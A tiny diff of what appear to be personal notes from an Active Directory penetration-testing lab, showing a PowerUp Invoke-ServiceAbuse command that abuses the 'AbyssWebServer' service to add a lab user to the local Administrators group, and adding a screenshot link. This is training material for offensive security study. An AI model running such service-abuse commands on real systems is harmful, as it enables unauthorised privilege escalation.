@@ -141,3 +141,4 @@ or to add ou user to the Local Administrator group
 ```PowerUp
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
 ```
+![[Pasted image 20231018145807.png]]
